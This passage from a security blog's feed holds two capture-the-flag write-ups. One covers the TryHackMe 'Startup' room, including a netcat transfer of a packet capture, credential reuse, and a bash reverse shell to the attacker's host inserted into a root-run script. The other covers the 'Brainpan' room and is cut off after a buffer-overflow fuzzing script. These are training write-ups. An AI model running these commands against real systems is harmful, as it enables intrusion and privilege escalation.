&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [(VPN IP)] from (UNKNOWN) [10.10.27.29] 48764
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:29:08 up 31 min,  0 users,  load average: 0.00, 1.01, 1.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We only have a limited shell as www-data so the next step is to enumerate the system to escalate privileges.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls -lah
total 100K
drwxr-xr-x  25 root     root     4.0K Nov 21 10:58 .
drwxr-xr-x  25 root     root     4.0K Nov 21 10:58 ..
drwxr-xr-x   2 root     root     4.0K Sep 25 08:12 bin
drwxr-xr-x   3 root     root     4.0K Sep 25 08:12 boot
drwxr-xr-x  16 root     root     3.5K Nov 21 10:58 dev
drwxr-xr-x  96 root     root     4.0K Nov 12 05:08 etc
drwxr-xr-x   3 root     root     4.0K Nov 12 04:53 home
drwxr-xr-x   2 www-data www-data 4.0K Nov 12 04:53 incidents
lrwxrwxrwx   1 root     root       33 Sep 25 08:12 initrd.img -&amp;gt; boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root       33 Sep 25 08:12 initrd.img.old -&amp;gt; boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root     4.0K Sep 25 08:22 lib
drwxr-xr-x   2 root     root     4.0K Sep 25 08:10 lib64
drwx------   2 root     root      16K Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 media
drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 mnt
drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 opt
dr-xr-xr-x 127 root     root        0 Nov 21 10:57 proc
-rw-r--r--   1 www-data www-data  136 Nov 12 04:53 recipe.txt
drwx------   4 root     root     4.0K Nov 12 04:54 root
drwxr-xr-x  25 root     root      920 Nov 21 11:20 run
drwxr-xr-x   2 root     root     4.0K Sep 25 08:22 sbin
drwxr-xr-x   2 root     root     4.0K Nov 12 04:50 snap
drwxr-xr-x   3 root     root     4.0K Nov 12 04:52 srv
dr-xr-xr-x  13 root     root        0 Nov 21 11:31 sys
drwxrwxrwt   7 root     root     4.0K Nov 21 11:31 tmp
drwxr-xr-x  10 root     root     4.0K Sep 25 08:09 usr
drwxr-xr-x   2 root     root     4.0K Nov 12 04:50 vagrant
drwxr-xr-x  14 root     root     4.0K Nov 12 04:52 var
lrwxrwxrwx   1 root     root       30 Sep 25 08:12 vmlinuz -&amp;gt; boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root       30 Sep 25 08:12 vmlinuz.old -&amp;gt; boot/vmlinuz-4.4.0-190-generic
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As www-data we own a folder and a txt file. I checked the incidents folder and found a pcapng file, I used netcat to transfer the file to my machine so I could review in Wireshark.&lt;/p&gt;

&lt;p&gt;On my machine:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌──[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $nc -nvlp 8080 &amp;gt; catch.pcapng
listening on [any] 8080 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Back on Startup:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cd incidents
$ ls
suspicious.pcapng
$ nc [VPN IP] 8080 &amp;lt; suspicious.pcapng
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opening the file in Wireshark allows us to review the packet capture and review the captured incident.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/startup/wireshark.png&quot; alt=&quot;wireshark&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Scanning through it appears someone has completed the same steps I have by uploading a web shell and navigating to the directory via port 80 and executed the reverse shell. After the GET request I can see TCP packets on port 4444. Right click on one of the packets and select Follow &amp;gt; TCP Stream. This will show the entire TCP stream and all the commands and responses between the attacker and the server.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
data
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ ls -la
total 96
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -&amp;gt; boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -&amp;gt; boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
drwx------   3 root     root      4096 Oct  2 17:24 root
drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -&amp;gt; boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -&amp;gt; boot/vmlinuz-4.4.0-190-generic
$ whoami
www-data
$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
www-data@startup:/$ cd
cd
bash: cd: HOME not set
www-data@startup:/$ ls
ls
bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: [redacted]]

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: [redacted]]

sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
www-data@startup:/home$ exit
exit
exit
$ exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I have redacted the output to hide the password however its clearly visible in the output in the Wireshark capture. Im going to assume the user has not changed their password and try to login in using SSH with the capture credentials.&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;SSH works as expected as the user ‘lennie’. Logging in I can now grab the first flag user.txt.&lt;/p&gt;

&lt;p&gt;To complete this room we need to escalate our privileges to root to grab the final flag. In the users home directly are two folders ‘Documents’ and ‘scripts’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $ssh lennie@startup
lennie@startup's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

44 packages can be updated.
30 updates are security updates.


Last login: Sat Nov 21 12:01:37 2020 from (VPN IP)
$ bash
lennie@startup:~$ ls -alh
total 24K
drwx------ 5 lennie lennie 4.0K Nov 21 12:01 .
drwxr-xr-x 3 root   root   4.0K Nov 12 04:53 ..
drwx------ 2 lennie lennie 4.0K Nov 21 12:01 .cache
drwxr-xr-x 2 lennie lennie 4.0K Nov 12 04:53 Documents
drwxr-xr-x 2 root   root   4.0K Nov 12 04:54 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12 04:53 user.txt
lennie@startup:~$ cd Documents/
lennie@startup:~/Documents$ ls -lah
total 20K
drwxr-xr-x 2 lennie lennie 4.0K Nov 12 04:53 .
drwx------ 5 lennie lennie 4.0K Nov 21 12:01 ..
-rw-r--r-- 1 root   root    139 Nov 12 04:53 concern.txt
-rw-r--r-- 1 root   root     47 Nov 12 04:53 list.txt
-rw-r--r-- 1 root   root    101 Nov 12 04:53 note.txt
lennie@startup:~/Documents$ cat concern.txt 
I got banned from your library for moving the &quot;C programming language&quot; book into the horror section. Is there a way I can appeal? --Lennie
lennie@startup:~/Documents$ cat list.txt 
Shoppinglist: Cyberpunk 2077 | Milk | Dog food
lennie@startup:~/Documents$ cat note.txt 
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
lennie@startup:~/Documents$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nothing to important and this stage so I looked at scripts.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/Documents$ cd ..
lennie@startup:~$ cd scripts/
lennie@startup:~/scripts$ ls -lag
total 16
drwxr-xr-x 2 root   4096 Nov 12 04:54 .
drwx------ 5 lennie 4096 Nov 21 12:01 ..
-rwxr-xr-x 1 root     77 Nov 12 04:53 planner.sh
-rw-r--r-- 1 root      1 Nov 21 12:07 startup_list.txt
lennie@startup:~/scripts$ ls -lah
total 16K
drwxr-xr-x 2 root   root   4.0K Nov 12 04:54 .
drwx------ 5 lennie lennie 4.0K Nov 21 12:01 ..
-rwxr-xr-x 1 root   root     77 Nov 12 04:53 planner.sh
-rw-r--r-- 1 root   root      1 Nov 21 12:07 startup_list.txt
lennie@startup:~/scripts$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Two files both owned by root.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/scripts$ cat startup_list.txt 

lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST &amp;gt; /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It appears the planner.sh bash script echos the LIST variable to the startup_list.txt file, however the file is currently blank. Then it runs the script found at /etc/print.sh&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/scripts$ cat /etc/print.sh
#!/bin/bash
echo &quot;Done!&quot;
lennie@startup:~/scripts$ ls -lah /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12 04:53 /etc/print.sh
lennie@startup:~/scripts$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/etc/print.sh simply echos “Done!” however the user Lennie owns this file so we can edit the script and make it do what we want. Before I do that though I need to be sure that root will run the script regularly. To do that I use a tool called &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I use python3 to start a quick http server: &lt;em&gt;sudo python3 -m http.server 80&lt;/em&gt;. On the Startup machine I download pspy and execute.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/scripts$ cd /dev/shm
lennie@startup:/dev/shm$ wget http://(VPN IP)/pspy64
--2020-11-21 12:13:38--  http://(VPN IP)/pspy64
Connecting to (VPN IP):80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                      100%[=========================================================================================&amp;gt;]   2.94M  1.60MB/s    in 1.8s

2020-11-21 12:13:40 (1.60 MB/s) - ‘pspy64’ saved [3078592/3078592]

lennie@startup:/dev/shm$ chmod +x pspy64 
lennie@startup:/dev/shm$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;pspy will now show all the processes running and the users associated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/startup/pspy.png&quot; alt=&quot;pspy&quot; /&gt;&lt;/p&gt;

&lt;p&gt;root is running the script regularly, I can determine its root as the UID is 0.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/scripts$ cat /etc/print.sh
#!/bin/bash
echo &quot;Done!&quot;
bash -i &amp;gt;&amp;amp; /dev/tcp/(VPN IP)/8888 0&amp;gt;&amp;amp;1
lennie@startup:~/scripts$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I edit the print.sh script with a bash reverse shell one liner and wait for the script to execute.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $nc -nvlp 8888
listening on [any] 8888 ...
connect to [(VPN IP)] from (UNKNOWN) [10.10.27.29] 34830
bash: cannot set terminal process group (2212): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# cd /root
cd /root
root@startup:~# ls -lah
ls -lah
total 28K
drwx------  4 root root 4.0K Nov 12 04:54 .
drwxr-xr-x 25 root root 4.0K Nov 21 10:58 ..
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4.0K Nov 12 04:54 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   38 Nov 12 04:53 root.txt
drwx------  2 root root 4.0K Nov 12 04:50 .ssh
root@startup:~# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wait a few seconds and root shell! I really enjoyed this room, particularly the Wireshark element reviewing the capture to locate credentials.&lt;/p&gt;

&lt;h3 id=&quot;secret-ingredient&quot;&gt;Secret ingredient&lt;/h3&gt;

&lt;p&gt;I still need to find the secret ingredient from the recipe! This can be found at /recipe.txt&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was [redacted].
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Brainpan 1 Write Up</title><link href="https://darrynbrownfield.co.uk/brainpain" rel="alternate" type="text/html" title="Brainpan 1 Write Up" /><published>2020-10-10T00:00:00+00:00</published><updated>2020-10-10T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/brainpain</id><content type="html" xml:base="https://darrynbrownfield.co.uk/brainpain">&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/cover.png&quot; alt=&quot;brainpan&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;Brainpan is a great OSCP practice room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. The box was first released on Vulnhub by &lt;a href=&quot;https://twitter.com/superkojiman&quot;&gt;superkojiman&lt;/a&gt; so full credit to you for a fantastic box that I’m sure has helped a lot of people prepare for the OSCP exam. I completed the room about 5 days before I took the OSCP exam and I think it really helped enforce what I had learnt on the course and kept the steps fresh in my mind.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]                                                                                                                             
└──╼ $sudo nmap -sC -sV -oA nmap/initial brainpan                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 12:16 BST                                                                                                             
Nmap scan report for brainpan                                                                                                                                          
Host is up (0.030s latency).                                                                                                                                                
Not shown: 998 closed ports                                                                                                                                                 
PORT      STATE SERVICE VERSION                                                                                                                                             
9999/tcp  open  abyss?                                                                                                                                                      
| fingerprint-strings:                                                                                                                                                      
|   NULL:                                                                                                                                                                   
|     _| _|                                                                                                                                                                 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|                                                                                                                     
|     _|_| _| _| _| _| _| _| _| _| _| _| _|                                                                                                                                 
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|                                                                                                                         
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=10/10%Time=5F81982F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,298,&quot;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20&amp;gt;&amp;gt;\x20&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.85 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 ports open 9999 and 10000.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Starting with 9999 I use netcat to look at the port.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $nc brainpan 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                            

                          &amp;gt;&amp;gt; test
                          ACCESS DENIED
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Port 9999 provides a banner with the name of the machine and also a input to enter a password.&lt;/p&gt;

&lt;p&gt;Port 10000 is a python http server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/web.png&quot; alt=&quot;brainpan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Navigating to the page just displays a image about safe coding. Nothing useful in the source either. I ran a gobuster to check for other directories.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $gobuster dir -u http://brainpan:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://brainpan:10000
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/10 12:25:40 Starting gobuster
===============================================================
/bin (Status: 301)
===============================================================
2020/10/10 12:29:46 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Only one, navigating to the directory presents a brainpan.exe file&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/bin.png&quot; alt=&quot;bin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As I know this machine is based around buffer overflow its safe to assume this is the file I will need to analyse. I’m more comfortable working in Immunity Debugger on Windows for exploit development so I transfer the file over to my windows VM. I have a shared folder on my host machine that I can use to copy files between VM’s so I copy the file in to that folder on my ParrotOS machine and boot my Windows VM.&lt;/p&gt;

&lt;h3 id=&quot;exploit-development&quot;&gt;Exploit Development&lt;/h3&gt;

&lt;p&gt;Now I have the exe on my windows machine, I ran the file and as expected it appears to be the application I connected to on port 9999. From my Parrot machine I connect to my windows machine on port 9999.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/bin.png&quot; alt=&quot;brainpan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I get the same prompt. Next I opened Immunity Debugger and attached the brainpan service. (This step is repeated a lot during exploit development! Each time I run my exploit script I closed Immunity Debugger reopen and reattach the brainpan.exe)&lt;/p&gt;

&lt;h4 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h4&gt;

&lt;p&gt;Looking at the output from the exe console, the application is copying the input to a buffer. So first we need need to fuzz the application to see if we can crash the application and overwrite the buffer.&lt;/p&gt;

&lt;p&gt;I have created a very simple python script to fuzz the application. I updated my hosts file to connect to my windows VM rather than TryHackMe for now.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = &quot;A&quot; * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((&quot;brainpan&quot;,9999))
        s.recv(1024)
        s.send(buffer + &quot;\r\n&quot;)
        s.close()
        sleep(1)
        buffer = buffer + &quot;A&quot; * 100

    except:
       print(&quot;Fuzzing crashed at %s bytes&quot; % str(len(buffer)))
       sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The script will send 100 A’s to the application and will keep increasing the sent characters by 100 on each attempt. If the application crashes the script will fail and print out the length of A’s sent at the time of the crash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $sudo python exploit.py
Fuzzing crashed at 700 bytes
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the script I can see it crashed at 700 bytes. Looking in Immunity debugger I can see the status is now showing ‘Paused’ rather than running indicating a crash.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/crash.png&quot; alt=&quot;crash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EIP is showing 41414141 which is AAAA so we have successfully overwrote EIP. If I can control EIP I may be able to exploit the application to create a reverse shell.&lt;/p&gt;

&lt;h4 id=&quot;find-offset&quot;&gt;Find Offset&lt;/h4&gt;

